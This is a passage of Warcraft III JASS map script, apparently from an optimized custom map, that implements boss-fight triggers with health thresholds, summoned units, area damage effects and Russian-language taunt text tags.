call SetUnitLifeBJ(GetEnumUnit(),GetUnitStateSwap(UNIT_STATE_LIFE,GetEnumUnit())-100000.)
else
endif
endfunction
function Boz takes nothing returns boolean
if not (GetUnitLifePercent(K9)<=I2R(TN[1])) then
return false
endif
if not (IsUnitAliveBJ(GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function Bo0 takes nothing returns nothing
if Boz() then
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(GetTriggerUnit(),I2R(TN[1]))
set TN[1]=TN[1]-15
call CreateTextTagUnitBJ("|c00FF0000Все умрут|r",K9,0,10,100,100,100,0)
call SetTextTagTextBJ(GetLastCreatedTextTag(),"|c00FF0000Все умрут|r",20.)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
call SetUnitInvulnerable(K9,true)
call PauseUnit(GetTriggerUnit(),true)
call TriggerSleepAction(3.)
call PauseUnit(GetTriggerUnit(),false)
call SetUnitInvulnerable(K9,false)
call ForGroupBJ(GetUnitsInRangeOfLocAll(512,GetUnitLoc(GetTriggerUnit())),function Boy)
call AddSpecialEffectTargetUnitBJ("overhead",K9,"Units\\NightElf\\Wisp\\WispExplode.mdl")
call DestroyEffectBJ(GetLastCreatedEffectBJ())
call EnableTrigger(GetTriggeringTrigger())
else
endif
endfunction
function Bo1 takes nothing returns nothing
set gB=CreateTrigger()
call DisableTrigger(gB)
call TriggerRegisterUnitEvent(gB,K9,EVENT_UNIT_DAMAGED)
call TriggerAddAction(gB,function Bo0)
endfunction
function Bo2 takes nothing returns boolean
if not (GetUnitAbilityLevel(GetTriggerUnit(),$5330304A)>=1) then
return false
endif
return true
endfunction
function Bo3 takes nothing returns boolean
if not (IsUnitAliveBJ(Wi[5])==true) then
return false
endif
return true
endfunction
function Bo4 takes nothing returns boolean
if not (IsUnitType(GetEnumUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function Bo5 takes nothing returns nothing
if Bo4() then
call SetUnitLifePercentBJ(GetEnumUnit(),5.)
else
endif
endfunction
function Bo6 takes nothing returns boolean
if not (IsUnitAliveBJ(Wi[6])==true) then
return false
endif
return true
endfunction
function Bo7 takes nothing returns boolean
if not (GetUnitLifePercent(K9)<=I2R(TN[2])) then
return false
endif
if not (IsUnitAliveBJ(GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function Bo8 takes nothing returns nothing
local location Mc
local location No
if Bo7() then
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(GetTriggerUnit(),I2R(TN[2]))
set TN[2]=TN[2]-30
call AddSpecialEffectLocBJ(GetRectCenter(GetPlayableMapRect()),"Abilities\\Spells\\Human\\ThunderClap\\ThunderClapCaster.mdl")
call CreateTextTagUnitBJ("|c006969FFЯ разорву вас на куски!|r",K9,0,15.,100,100,100,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
set Mc=Location(8233.,-23225.)
set Wi[5]=CreateUnitAtLoc(Player(10),$6E303154,Mc,270.)
call UnitApplyTimedLifeBJ(5.,$42544C46,Wi[5])
call RemoveLocation(Mc)
set No=Location(9367.,-24173.)
set Wi[6]=CreateUnitAtLoc(Player(10),$6E303153,No,270.)
call UnitApplyTimedLifeBJ(5.,$42544C46,Wi[6])
call RemoveLocation(No)
call TriggerSleepAction(4.)
if Bo3() then
call SetUnitLifePercentBJ(K9,100)
call RemoveUnit(Wi[5])
set TN[0]=75
set TN[1]=85
set TN[2]=80
if Bo2() then
call EnableTrigger(gC)
call EnableTrigger(f7)
call EnableTrigger(f8)
call EnableTrigger(gB)
call EnableTrigger(gD)
call EnableTrigger(gE)
call EnableTrigger(gF)
call EnableTrigger(gG)
call EnableTrigger(gH)
else
endif
else
endif
call RemoveUnit(Wi[5])
if Bo6() then
call ForGroupBJ(GetUnitsInRectAll(x),function Bo5)
call RemoveUnit(Wi[6])
else
endif
call RemoveUnit(Wi[6])
call EnableTrigger(GetTriggeringTrigger())
else
endif
set No=null
set Mc=null
endfunction
function Bo9 takes nothing returns nothing
set gC=CreateTrigger()
call TriggerRegisterUnitEvent(gC,K9,EVENT_UNIT_DAMAGED)
call TriggerAddAction(gC,function Bo8)
endfunction
function BpB takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$6830314D) then
return false
endif
return true
endfunction
function BpC takes nothing returns boolean
if not (IsUnitType(GetEnumUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function BpD takes nothing returns nothing
if BpC() then
call SetUnitLifePercentBJ(GetEnumUnit(),2.)
else
endif
endfunction
function BpE takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$6830314C) then
return false
endif
return true
endfunction
function BpF takes nothing returns boolean
if not (IsUnitType(GetEnumUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function BpG takes nothing returns nothing
if BpF() then
call SetUnitManaPercentBJ(GetEnumUnit(),0.)
else
endif
endfunction
function BpH takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$6830314E) then
return false
endif
return true
endfunction
function BpI takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$6830314F) then
return false
endif
return true
endfunction
function BpJ takes nothing returns nothing
if BpB() then
call SetUnitLifeBJ(K9,GetUnitStateSwap(UNIT_STATE_LIFE,K9)+350000.)
call RemoveUnit(GetTriggerUnit())
call CreateTextTagUnitBJ("|c0000FF00+350000!|r",K9,0,20.,100,100,100,0)
call SetTextTagTextBJ(GetLastCreatedTextTag(),"|c00FF0000Все умрут|r",20.)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
else
endif
if BpE() then
call RemoveUnit(GetTriggerUnit())
call CreateTextTagUnitBJ("|c00FF0000АХХАА!|r",K9,0,20.,100,100,100,0)
call SetTextTagTextBJ(GetLastCreatedTextTag(),"|c00FF0000Все умрут|r",20.)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
call ForGroupBJ(GetUnitsInRectAll(x),function BpD)
else
endif
if BpH() then
call RemoveUnit(GetTriggerUnit())
call CreateTextTagUnitBJ("|c000000FFАХХАА!|r",K9,0,20.,100,100,100,0)
call SetTextTagTextBJ(GetLastCreatedTextTag(),"|c00FF0000Все умрут|r",20.)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
call ForGroupBJ(GetUnitsInRectAll(x),function BpG)
else
endif
if BpI() then
call RemoveUnit(GetTriggerUnit())
call CreateTextTagUnitBJ("|c00FF0000АХХАА!|r",K9,0,20.,100,100,100,0)
call SetTextTagTextBJ(GetLastCreatedTextTag(),"|c00FF0000Все умрут|r",20.)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
set YV[124]=GetRectCenter(Ce)
call CreateNUnitsAtLoc(1,$68303151,Player(10),YV[124],bj_UNIT_FACING)
call RemoveLocation(YV[124])
else
endif
endfunction
function BpK takes nothing returns nothing
set gI=CreateTrigger()
call TriggerRegisterEnterRectSimple(gI,Ce)
call TriggerAddAction(gI,function BpJ)
endfunction
function BpL takes nothing returns nothing
local unit Hu=GetEnumUnit()
local location Ht=GetUnitLoc(K9)
call SetUnitPositionLoc(Hu,Ht)
call UnitDamageTarget(K9,Hu,20000,true,false,ATTACK_TYPE_MAGIC,DAMAGE_TYPE_MAGIC,WEAPON_TYPE_WHOKNOWS)
call RemoveLocation(Ht)
set Ht=null
set Hu=null
endfunction
function BpM takes nothing returns nothing
local unit Hu=LoadUnitHandle(fl,GetHandleId(GetExpiredTimer()),1)
local location Mc
local location No
local group Np
local boolexpr Nt
call SaveInteger(fl,GetHandleId(GetExpiredTimer()),2,LoadInteger(fl,GetHandleId(GetExpiredTimer()),2)-1)
if LoadInteger(fl,GetHandleId(GetExpiredTimer()),2)>=1 then
set Mc=GetUnitLoc(Hu)
set No=nU(Mc,10,GetUnitFacing(Hu))
call SetUnitPositionLoc(Hu,No)
set Np=CreateGroup()
set Nt=Condition(function my)
call GroupEnumUnitsInRange(Np,GetLocationX(Mc),GetLocationY(Mc),70,Nt)
call DestroyBoolExpr(Nt)
set Pq=Hu
set Nu=50000
call ForGroup(Np,function nB)
call DestroyGroup(Np)
set Nt=null
set Np=null
call RemoveLocation(Mc)
set Mc=null
call RemoveLocation(No)
set No=null
else
call RemoveUnit(Hu)
call RemoveSavedHandle(fl,GetHandleId(GetExpiredTimer()),1)
call RemoveSavedInteger(fl,GetHandleId(GetExpiredTimer()),2)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
set Hu=null
endfunction
function BpN takes nothing returns nothing
local unit Hu=CreateUnit(Player(10),$68303739,8820,-23684,30*LoadInteger(fl,GetHandleId(GetExpiredTimer()),2))
local timer Hc
call AddSpecialEffectTarget("war3mapImported\\Firebrand Shot Red.mdl",Hu,"chest")
call SetUnitScale(Hu,4,4,4)
set Hc=CreateTimer()
call SaveUnitHandle(fl,GetHandleId(Hc),1,Hu)
call SaveInteger(fl,GetHandleId(Hc),2,200)
call TimerStart(Hc,.07,true,function BpM)
set Hc=null
set Hu=null
call SaveInteger(fl,GetHandleId(GetExpiredTimer()),2,LoadInteger(fl,GetHandleId(GetExpiredTimer()),2)-1)
if LoadInteger(fl,GetHandleId(GetExpiredTimer()),2)<1 then
call RemoveSavedInteger(fl,GetHandleId(GetExpiredTimer()),2)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
endfunction
function BpO takes nothing returns nothing
local timer Mc
if GetUnitAbilityLevel(K9,$4130314A)==3 and GetUnitLifePercent(K9)<=I2R(TN[3]) and GetOwningPlayer(K9)!=Player(PLAYER_NEUTRAL_PASSIVE) then
call SetUnitLifePercentBJ(K9,I2R(TN[3]))
set TN[3]=TN[3]-15
call DisableTrigger(GetTriggeringTrigger())
call nh(K9,"|c00000000Смерть? Легко!",.031,255,255,255)
call TriggerSleepAction(2.)
set Mc=CreateTimer()
call SaveInteger(fl,GetHandleId(Mc),2,13)
call TimerStart(Mc,.5,true,function BpN)
set Mc=null
if TN[3]<35 then
set Mc=CreateTimer()
call SaveInteger(fl,GetHandleId(Mc),2,13)
call TimerStart(Mc,.5,true,function BpN)
set Mc=null
endif
set Mc=null
call EnableTrigger(GetTriggeringTrigger())
endif
endfunction
function BpP takes nothing returns nothing
local group Mc
local boolexpr No
if GetUnitAbilityLevel(K9,$4130314A)==3 and GetOwningPlayer(K9)!=Player(PLAYER_NEUTRAL_PASSIVE) and GetUnitLifePercent(K9)<=I2R(TN[4]) then
call SetUnitLifePercentBJ(K9,I2R(TN[4]))
set TN[4]=TN[4]-15
call DisableTrigger(GetTriggeringTrigger())
call nh(K9,"|c00ff9696Идите сюда",.028,255,255,255)
call TriggerSleepAction(1.5)
set Mc=CreateGroup()
set No=Condition(function my)
call GroupEnumUnitsInRange(Mc,GetUnitX(K9),GetUnitY(K9),1000,No)
call DestroyBoolExpr(No)
call ForGroup(Mc,function BpL)
call DestroyGroup(Mc)
set No=null
set Mc=null
call EnableTrigger(GetTriggeringTrigger())
endif
endfunction
function BpQ takes nothing returns nothing
local location Mc
local location No
local unit Np
if GetUnitAbilityLevel(K9,$4130314A)==3 and GetOwningPlayer(K9)!=Player(PLAYER_NEUTRAL_PASSIVE) then
call DisableTrigger(GetTriggeringTrigger())
call TriggerSleepAction(30.)
call nh(K9,"|c00ff00ffМёртвые придут!",.028,255,255,255)
set Mc=Location(8191,-23142)
set No=Location(8816,-23697)
set Np=CreateUnitAtLoc(Player(10),$6830314D,Mc,0)
call IssuePointOrderLoc(Np,"move",No)
call RemoveLocation(Mc)
set Mc=null
set Np=null
set Mc=Location(9469,-23173)
set Np=CreateUnitAtLoc(Player(10),$6830314C,Mc,0)
call IssuePointOrderLoc(Np,"move",No)
call RemoveLocation(Mc)
set Mc=null
set Np=null
set Mc=Location(9410,-24237)
set Np=CreateUnitAtLoc(Player(10),$6830314E,Mc,0)
call IssuePointOrderLoc(Np,"move",No)
call RemoveLocation(Mc)
set Mc=null
set Np=null
set Mc=Location(8201,-24245)
set Np=CreateUnitAtLoc(Player(10),$6830314F,Mc,0)
call IssuePointOrderLoc(Np,"move",No)
call RemoveLocation(Mc)
set Mc=null
set Np=null
call RemoveLocation(No)
set No=null
set Np=null
call EnableTrigger(GetTriggeringTrigger())
endif
endfunction
function BpR takes nothing returns nothing
local trigger Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,K9,EVENT_UNIT_DAMAGED)
call TriggerAddAction(Hc,function BpQ)
set Hc=null
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,K9,EVENT_UNIT_DAMAGED)
call TriggerAddAction(Hc,function BpP)
set Hc=null
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,K9,EVENT_UNIT_DAMAGED)
call TriggerAddAction(Hc,function BpO)
set Hc=null
endfunction
function BpS takes nothing returns boolean
if not (GetUnitLifePercent(K9)<=50.) then
return false
endif
return true
endfunction
function BpT takes nothing returns nothing
if BpS() then
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(GetTriggerUnit(),50.)
call PauseUnit(GetTriggerUnit(),true)
call SetUnitInvulnerable(GetTriggerUnit(),true)
call EnableTrigger(Uu)
call ShowUnit(KG,true)
call CreateNUnitsAtLoc(1,$6830334F,Player(10),GetRectCenter(Ce),bj_UNIT_FACING)
else
endif
endfunction
function BpU takes nothing returns nothing
set gE=CreateTrigger()
call DisableTrigger(gE)
call TriggerRegisterUnitEvent(gE,K9,EVENT_UNIT_DAMAGED)
call TriggerAddAction(gE,function BpT)
endfunction
function BpV takes nothing returns boolean
if not (GetUnitLifePercent(K9)<=35.) then
return false
endif
return true
endfunction
function BpW takes nothing returns nothing
if BpV() then
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(GetTriggerUnit(),35.)
call PauseUnit(GetTriggerUnit(),true)
call SetUnitInvulnerable(GetTriggerUnit(),true)
call EnableTrigger(Uu)
call SetUnitPosition(K9,8837,-23140)
call CreateNUnitsAtLoc(1,$68303350,Player(10),GetRectCenter(Ce),bj_UNIT_FACING)
call ShowUnit(KG,true)
else
endif
endfunction
function BpX takes nothing returns nothing
set gH=CreateTrigger()
call DisableTrigger(gH)
call TriggerRegisterUnitEvent(gH,K9,EVENT_UNIT_DAMAGED)
call TriggerAddAction(gH,function BpW)
endfunction
function BpY takes nothing returns boolean
if not (GetUnitLifePercent(K9)<=20.) then
return false
endif
return true
endfunction
function BpZ takes nothing returns nothing
if BpY() then
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(GetTriggerUnit(),20.)
call PauseUnit(GetTriggerUnit(),true)
call SetUnitInvulnerable(GetTriggerUnit(),true)
call EnableTrigger(Uu)
call SetUnitPosition(K9,8837,-23140)
call CreateNUnitsAtLoc(1,$68303351,Player(10),GetRectCenter(Ce),bj_UNIT_FACING)
call ShowUnit(KG,true)
else
endif
endfunction
function Bpa takes nothing returns nothing
set gF=CreateTrigger()
call DisableTrigger(gF)
call TriggerRegisterUnitEvent(gF,K9,EVENT_UNIT_DAMAGED)
call TriggerAddAction(gF,function BpZ)
endfunction
function Bpb takes nothing returns boolean
if not (GetUnitLifePercent(K9)<=5.) then
return false
endif
return true
endfunction
function Bpc takes nothing returns nothing
if Bpb() then
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(GetTriggerUnit(),5.)
call PauseUnit(GetTriggerUnit(),true)
call SetUnitInvulnerable(GetTriggerUnit(),true)
call EnableTrigger(Uu)
call SetUnitPosition(K9,8837,-23140)
call CreateNUnitsAtLoc(1,$68303352,Player(10),GetRectCenter(Ce),bj_UNIT_FACING)
call ShowUnit(KG,true)
else
endif
endfunction
function Bpd takes nothing returns nothing
set gG=CreateTrigger()
call DisableTrigger(gG)
call TriggerRegisterUnitEvent(gG,K9,EVENT_UNIT_DAMAGED)
call TriggerAddAction(gG,function Bpc)
endfunction
function Bpe takes nothing returns nothing
local location fE
call DisableTrigger(GetTriggeringTrigger())
call TriggerSleepAction(15.)
set fE=GetRandomLocInRect(BS)
call CreateNUnitsAtLoc(1,$75303059,Player(10),fE,bj_UNIT_FACING)
call UnitApplyTimedLifeBJ(4.,$42544C46,GetLastCreatedUnit())
call RemoveLocation(fE)
call EnableTrigger(GetTriggeringTrigger())
set fE=null
endfunction
function Bpf takes nothing returns nothing
set eO=CreateTrigger()
call DisableTrigger(eO)
call TriggerRegisterUnitEvent(eO,K9,EVENT_UNIT_DAMAGED)
call TriggerAddAction(eO,function Bpe)
endfunction
function Bpg takes nothing returns nothing
local group V9
local boolexpr gJ
local location Mc
local location No
local location Np
local integer Nt
local location Ny
local boolexpr Ot
call nh(KG,"|c00ff9696А вот тут мы и позабавимся",.023,255,255,255)
call TriggerSleepAction(1.6)
set V9=CreateGroup()
set gJ=Condition(function my)
call GroupEnumUnitsInRect(V9,x,gJ)
call DestroyBoolExpr(gJ)
if CountUnitsInGroup(V9)!=0 then
call ForGroup(V9,function BpL)
call DestroyGroup(V9)
set gJ=null
set V9=null
set Mc=GetUnitLoc(KG)
set No=Location(GetRandomReal(8140,9550),-24170)
call SetUnitFacingTimed(KG,AngleBetweenPoints(Mc,No),0)
call RemoveLocation(Mc)
call RemoveLocation(No)
call TriggerSleepAction(2.1)
set Np=GetUnitLoc(KG)
set Nt=50
loop
set Ny=nU(Np,Nt,GetUnitFacing(KG))
call DestroyEffect(AddSpecialEffectLoc("Abilities\\Spells\\Undead\\AnimateDead\\AnimateDeadTarget.mdl",Ny))
set V9=CreateGroup()
set Ot=Condition(function my)
call GroupEnumUnitsInRange(V9,GetLocationX(Ny),GetLocationY(Ny),80,Ot)
call DestroyBoolExpr(Ot)
set Pq=KG
set Nu=95000
call ForGroup(V9,function nB)
call DestroyGroup(V9)
set Ot=null
set V9=null
call RemoveLocation(Ny)
set Ny=null
set Nt=Nt+50
exitwhen Nt>=2300
endloop
call RemoveLocation(Np)
set Np=null
else
call DisableTrigger(Uu)
endif
set No=null
set Mc=null
set V9=null
endfunction
function Bph takes nothing returns nothing
set Uu=CreateTrigger()
call DisableTrigger(Uu)
call TriggerRegisterTimerEventPeriodic(Uu,9.)
call TriggerAddAction(Uu,function Bpg)
endfunction
function Bpi takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$75303059) then
return false
endif
return true
endfunction
function Bpj takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function Bpk takes nothing returns nothing
call SetUnitLifePercentBJ(GetEnumUnit(),5.)
endfunction
function Bpl takes nothing returns nothing
local location d2=GetUnitLoc(GetTriggerUnit())
local group Xx=GetUnitsInRangeOfLocMatching(400.,d2,Condition(function Bpj))
call ForGroupBJ(Xx,function Bpk)
call RemoveLocation(d2)
call DestroyGroup(Xx)
set Xx=null
set d2=null
endfunction
function Bpm takes nothing returns nothing
set gK=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(gK,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddCondition(gK,Condition(function Bpi))
call TriggerAddAction(gK,function Bpl)
endfunction
function Bpn takes nothing returns nothing
local unit VB=GetTriggerUnit()
local location Mc
local location No
local unit Np
local location Nt
local unit Ny
local integer Ot
local location Ou
local location Ov
local real Ow
local real Ox
local real Oz
local group O0
local boolexpr O1
call DisableTrigger(GetTriggeringTrigger())
call TriggerSleepAction(15)
if GetOwningPlayer(VB)==Player(11) then
set Mc=GetUnitLoc(VB)
set No=Location(10404,-22708)
set Np=CreateUnitAtLoc(Player(11),$6E303234,No,270)
call SetUnitFacingToFaceLocTimed(Np,Mc,1)
set Nt=Location(12644,-22708)
set Ny=CreateUnitAtLoc(Player(11),$6E303234,Nt,270)
call SetUnitFacingToFaceLocTimed(Ny,Mc,1)
call TriggerSleepAction(3)
set Ot=80
loop
set Ou=nU(No,Ot,GetUnitFacing(Np))
call DestroyEffect(AddSpecialEffectLoc("war3mapImported\\AquaSpike.mdx",Ou))
set Ow=GetLocationX(Ou)
set Ox=GetLocationY(Ou)
set Oz=100.
set O0=CreateGroup()
set O1=Condition(function my)
call GroupEnumUnitsInRange(O0,Ow,Ox,Oz,O1)
call DestroyBoolExpr(O1)
set Pq=Np
set Nu=200000
call ForGroup(O0,function nB)
call DestroyGroup(O0)
set O1=null
set O0=null
call RemoveLocation(Ou)
set Ou=null
set Ot=Ot+80
exitwhen Ot>=2000
endloop
set Ot=80
loop
set Ov=nU(Nt,Ot,GetUnitFacing(Ny))
call DestroyEffect(AddSpecialEffectLoc("war3mapImported\\AquaSpike.mdx",Ov))
set Ow=GetLocationX(Ov)
set Ox=GetLocationY(Ov)
set Oz=100.
set O0=CreateGroup()
set O1=Condition(function my)
call GroupEnumUnitsInRange(O0,Ow,Ox,Oz,O1)
call DestroyBoolExpr(O1)
set Pq=Ny
set Nu=200000
call ForGroup(O0,function nB)
call DestroyGroup(O0)
set O1=null
set O0=null
call RemoveLocation(Ov)
set Ov=null
set Ot=Ot+80
exitwhen Ot>=2000
endloop
call RemoveLocation(No)
call RemoveLocation(Nt)
call RemoveLocation(Mc)
call RemoveUnit(Np)
call RemoveUnit(Ny)
set No=null
set Nt=null
set Mc=null
set Np=null
set Ny=null
endif
call EnableTrigger(GetTriggeringTrigger())
set VB=null
endfunction
function Bpo takes nothing returns nothing
local trigger gL=CreateTrigger()
call TriggerRegisterUnitEvent(gL,LH,EVENT_UNIT_DAMAGED)
call TriggerAddAction(gL,function Bpn)
set gL=null
endfunction
function Bpp takes nothing returns nothing
local unit Hu=GetEnumUnit()
if Nu==1 then
if RectContainsUnit(Rect(11517,-24457,12600,-23420),Hu)!=true then
call KillUnit(Hu)
endif
elseif Nu==2 then
if RectContainsUnit(Rect(11517,-24457,10440,-23420),Hu)!=true then
call KillUnit(Hu)
endif
elseif Nu==3 then
if RectContainsUnit(Rect(10440,-23420,15517,-22380),Hu)!=true then
call KillUnit(Hu)
endif
elseif Nu==4 then
if RectContainsUnit(Rect(11517,-23380,12600,-22420),Hu)!=true then
call KillUnit(Hu)
endif
endif
set Hu=null
endfunction
function Bpq takes nothing returns nothing
local unit Mc
local location No
local region Np
local region Nt
local region Ny
local region Ot
local integer Ou
local effect Ov
local group Ow
local boolexpr Ox
if GetUnitAbilityLevel(LH,$41303647)==2 and GetUnitLifePercent(LH)<=I2R(UP[1]) then
call SetUnitLifePercentBJ(LH,I2R(UP[1]))
set UP[1]=UP[1]-10
call DisableTrigger(GetTriggeringTrigger())
set Mc=GetTriggerUnit()
set No=GetUnitLoc(Mc)
if GetUnitAbilityLevel(Mc,$5330304A)>=1 then
if GetOwningPlayer(Mc)==Player(11) then
set Np=CreateRegion()
set Nt=CreateRegion()
set Ny=CreateRegion()
set Ot=CreateRegion()
call RegionAddRect(Np,Rect(11517,-24457,12600,-23420))
call RegionAddRect(Nt,Rect(11517,-24457,10440,-23420))
call RegionAddRect(Ny,Rect(10440,-23420,15517,-22380))
call RegionAddRect(Ot,Rect(11517,-23380,12600,-22420))
set Ou=GetRandomInt(1,4)
if Ou==1 then
set Ov=AddSpecialEffect("war3mapImported\\Void Disc.mdx",11950,-23874)
elseif Ou==2 then
set Ov=AddSpecialEffect("war3mapImported\\Void Disc.mdx",11103,-23874)
elseif Ou==3 then
set Ov=AddSpecialEffect("war3mapImported\\Void Disc.mdx",11103,-22955)
elseif Ou==4 then
set Ov=AddSpecialEffect("war3mapImported\\Void Disc.mdx",11950,-22955)
endif
call TriggerSleepAction(4)
call DestroyEffect(Ov)
set Ow=CreateGroup()
set Ox=Condition(function my)
call GroupEnumUnitsInRange(Ow,GetLocationX(No),GetLocationY(No),2000,Ox)
call DestroyBoolExpr(Ox)
set Nu=Ou
call ForGroup(Ow,function Bpp)
call DestroyGroup(Ow)
set Ox=null
set Ow=null
set Ov=null
call RemoveRegion(Np)
call RemoveRegion(Nt)
call RemoveRegion(Ny)
call RemoveRegion(Ot)
set Np=null
set Nt=null
set Ny=null
set Ot=null
endif
endif
call RemoveLocation(No)
set No=null
set Mc=null
call EnableTrigger(GetTriggeringTrigger())
endif
endfunction
function Bpr takes nothing returns nothing
local trigger gM=CreateTrigger()
call TriggerRegisterUnitEvent(gM,LH,EVENT_UNIT_DAMAGED)
call TriggerAddAction(gM,function Bpq)
set gM=null
endfunction
function Bps takes nothing returns nothing
call RemoveUnit(GetEnumUnit())
endfunction
function Bpt takes nothing returns boolean
if not (IsUnitAliveBJ(LH)==true) then
return false
endif
if not (GetOwningPlayer(LH)==Player(11)) then
return false
endif
return true
endfunction
function Bpu takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call TriggerSleepAction(20.)
if Bpt() then
set YV[70]=GetRandomLocInRect(Dj)
call CreateNUnitsAtLoc(1,$6E303235,Player(10),YV[70],bj_UNIT_FACING)
set Wi[10]=GetLastCreatedUnit()
call nh(Wi[10],"|c00ff0000Беги!",.025,255,255,255)
call TriggerSleepAction(1.)
call AddSpecialEffectTargetUnitBJ("overhead",Wi[10],"Units\\NightElf\\Wisp\\WispExplode.mdl")
call DestroyEffectBJ(GetLastCreatedEffectBJ())
call TriggerSleepAction(2.)
call UnitDamagePointLoc(Wi[10],0,400.,GetUnitLoc(Wi[10]),5000.,ATTACK_TYPE_CHAOS,DAMAGE_TYPE_UNIVERSAL)
call TriggerSleepAction(1.)
set SR=GetUnitsOfTypeIdAll($6E303235)
call ForGroupBJ(SR,function Bps)
call DestroyGroup(SR)
call RemoveLocation(YV[70])
else
endif
call EnableTrigger(GetTriggeringTrigger())
endfunction
function Bpv takes nothing returns nothing
set eW=CreateTrigger()
call DisableTrigger(eW)
call TriggerRegisterUnitEvent(eW,LH,EVENT_UNIT_DAMAGED)
call TriggerAddAction(eW,function Bpu)
endfunction
function Bpw takes nothing returns nothing
call RemoveUnit(GetEnumUnit())
endfunction
function Bpx takes nothing returns boolean
if not (IsUnitAliveBJ(LH)==true) then
return false
endif
if not (GetOwningPlayer(LH)==Player(11)) then
return false
endif
return true
endfunction
function Bpy takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call TriggerSleepAction(20.)
if Bpx() then
set YV[70]=GetRandomLocInRect(Dj)
call CreateNUnitsAtLoc(1,$6E303235,Player(10),YV[70],bj_UNIT_FACING)
set Wi[10]=GetLastCreatedUnit()
call nh(Wi[10],"|c00ff0000Беги!",.025,255,255,255)
call TriggerSleepAction(1.)
call AddSpecialEffectTargetUnitBJ("overhead",Wi[10],"Units\\NightElf\\Wisp\\WispExplode.mdl")
call DestroyEffectBJ(GetLastCreatedEffectBJ())
call TriggerSleepAction(2.)
call UnitDamagePointLoc(Wi[10],0,700.,GetUnitLoc(Wi[10]),10000.,ATTACK_TYPE_CHAOS,DAMAGE_TYPE_UNIVERSAL)
call TriggerSleepAction(1.)
set SR=GetUnitsOfTypeIdAll($6E303235)
call ForGroupBJ(SR,function Bpw)
call DestroyGroup(SR)
call RemoveLocation(YV[70])
else
endif
call EnableTrigger(GetTriggeringTrigger())
endfunction
function Bpz takes nothing returns nothing
set ea=CreateTrigger()
call DisableTrigger(ea)
call TriggerRegisterUnitEvent(ea,LH,EVENT_UNIT_DAMAGED)
call TriggerAddAction(ea,function Bpy)
endfunction
function Bp0 takes nothing returns nothing
call RemoveUnit(GetEnumUnit())
endfunction
function Bp1 takes nothing returns boolean
if not (IsUnitAliveBJ(LH)==true) then
return false
endif
if not (GetOwningPlayer(LH)==Player(11)) then
return false
endif
return true
endfunction
function Bp2 takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call TriggerSleepAction(15.)
if Bp1() then
set YV[71]=GetRandomLocInRect(Dj)
call CreateNUnitsAtLoc(1,$68303037,Player(10),YV[71],bj_UNIT_FACING)
set Wi[11]=GetLastCreatedUnit()
call nh(Wi[11],"|c00ff00ffЯ здесь",.025,255,255,255)
call TriggerSleepAction(3.)
set SR=GetUnitsOfTypeIdAll($68303037)
call ForGroupBJ(SR,function Bp0)
call DestroyGroup(SR)
call RemoveLocation(YV[71])
else
endif
call EnableTrigger(GetTriggeringTrigger())
endfunction
function Bp3 takes nothing returns nothing
set eX=CreateTrigger()
call DisableTrigger(eX)
call TriggerRegisterUnitEvent(eX,LH,EVENT_UNIT_DAMAGED)
call TriggerAddAction(eX,function Bp2)
endfunction
function Bp4 takes nothing returns nothing
call RemoveUnit(GetEnumUnit())
endfunction
function Bp5 takes nothing returns boolean
if not (IsUnitAliveBJ(LH)==true) then
return false
endif
if not (GetOwningPlayer(LH)==Player(11)) then
return false
endif
return true
endfunction
function Bp6 takes nothing returns nothing
